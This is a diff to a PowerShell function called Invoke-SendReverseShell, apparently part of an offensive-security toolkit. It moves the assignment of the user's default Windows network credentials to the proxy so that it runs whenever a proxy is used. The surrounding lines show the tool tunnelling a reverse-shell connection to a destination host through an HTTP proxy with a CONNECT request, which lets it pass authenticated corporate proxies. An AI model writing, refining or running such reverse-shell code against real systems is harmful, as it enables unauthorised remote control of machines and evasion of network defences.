@@ -63,9 +63,8 @@ function Invoke-SendReverseShell
         Write-Verbose "Using proxy [$ProxyName`:$ProxyPort]"
     }
     elseif ($UseDefaultProxy) {
-        # Detect and set automatic proxy and network credentials
+        # Detect and set automatic proxy
         $Proxy = [System.Net.WebRequest]::DefaultWebProxy
-        $Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         $ProxyName = $Proxy.GetProxy($DestUri).Host
         $ProxyPort = $Proxy.GetProxy($DestUri).Port
         if ($ProxyName -eq $DestHost) {
@@ -78,6 +77,8 @@ function Invoke-SendReverseShell
     }    
 
     if ($UseProxy) {
+        # Detect and set automatic network credentials
+        $Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         $DestHostWebRequest = [System.Net.HttpWebRequest]::Create("http://" + $DestHost + ":" + $DestPort) 
         $DestHostWebRequest.Method = "CONNECT"
         $DestHostWebRequest.Proxy = $Proxy
